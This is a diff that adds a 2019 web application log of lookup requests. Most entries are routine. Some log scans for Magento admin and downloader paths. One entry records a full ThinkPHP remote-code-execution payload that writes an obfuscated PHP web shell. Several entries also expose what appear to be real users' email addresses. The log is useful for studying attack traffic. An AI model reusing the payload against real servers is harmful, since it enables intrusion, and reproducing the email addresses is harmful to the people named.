@@ -1,0 +1,43 @@
+2019-06-17 2:04:53 - INFO --> getUserByCookie: 
+2019-06-17 2:04:53 - INFO --> getZoomById: iSctp
+2019-06-17 2:04:53 - INFO --> incrementZoomById: iSctp
+2019-06-17 2:04:53 - INFO --> increment zoom: iSctp
+2019-06-17 2:06:36 - INFO --> getUserByCookie: 
+2019-06-17 2:06:36 - INFO --> getZoomById: email=theresesnyder%40me.com&reportType=&description=&
+2019-06-17 2:23:36 - INFO --> getUserByCookie: 
+2019-06-17 2:23:36 - INFO --> getZoomById: email=kelley%40tvsd.org&reportType=&description=&
+2019-06-17 2:50:33 - INFO --> getUserByCookie: 
+2019-06-17 2:50:33 - INFO --> getZoomById: email=srshaffer1971%40yahoo.com&reportType=&description=&
+2019-06-17 5:31:34 - INFO --> getUserByCookie: 
+2019-06-17 9:50:37 - INFO --> getUserByCookie: 
+2019-06-17 9:50:37 - INFO --> getZoomById: email=srshaffer1971%40yahoo.com&reportType=&description=&
+2019-06-17 10:40:26 - INFO --> getUserByCookie: 
+2019-06-17 10:40:26 - INFO --> getZoomById: magento/index.php/admin/
+2019-06-17 10:40:37 - INFO --> getUserByCookie: 
+2019-06-17 10:40:37 - INFO --> getZoomById: magento/downloader/index.php
+2019-06-17 10:40:40 - INFO --> getUserByCookie: 
+2019-06-17 10:40:40 - INFO --> getZoomById: magento/errors/503.php
+2019-06-17 10:40:44 - INFO --> getUserByCookie: 
+2019-06-17 10:40:44 - INFO --> getZoomById: store/index.php/admin/
+2019-06-17 10:40:53 - INFO --> getUserByCookie: 
+2019-06-17 10:40:53 - INFO --> getZoomById: store/downloader/index.php
+2019-06-17 10:40:56 - INFO --> getUserByCookie: 
+2019-06-17 10:40:56 - INFO --> getZoomById: store/errors/503.php
+2019-06-17 10:41:03 - INFO --> getUserByCookie: 
+2019-06-17 10:41:03 - INFO --> getZoomById: shop/index.php/admin/
+2019-06-17 10:41:12 - INFO --> getUserByCookie: 
+2019-06-17 10:41:12 - INFO --> getZoomById: shop/downloader/index.php
+2019-06-17 10:41:14 - INFO --> getUserByCookie: 
+2019-06-17 10:41:14 - INFO --> getZoomById: shop/errors/503.php
+2019-06-17 10:41:29 - INFO --> getUserByCookie: 
+2019-06-17 10:41:29 - INFO --> getZoomById: downloader/index.php
+2019-06-17 10:41:31 - INFO --> getUserByCookie: 
+2019-06-17 10:41:31 - INFO --> getZoomById: errors/503.php
+2019-06-17 12:14:20 - INFO --> getUserByCookie: 
+2019-06-17 12:14:20 - INFO --> getZoomById: s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=file_put_contents&vars%5B1%5D%5B%5D=uybvxxgspelf.php&vars%5B1%5D%5B%5D=%3C?php%20print(md5(222));$a=str_replace(%22vbnm%22,%22%22,%22asvbnmsert%22);@$a($_POST%5Bqazw%5D);?%3E
+2019-06-17 13:43:18 - INFO --> getUserByCookie: 
+2019-06-17 13:43:18 - INFO --> getZoomById: iSctp
+2019-06-17 13:43:18 - INFO --> incrementZoomById: iSctp
+2019-06-17 13:43:18 - INFO --> increment zoom: iSctp
+2019-06-17 15:58:42 - INFO --> getUserByCookie: 
+2019-06-17 15:58:42 - INFO --> getZoomById: plus/download.php
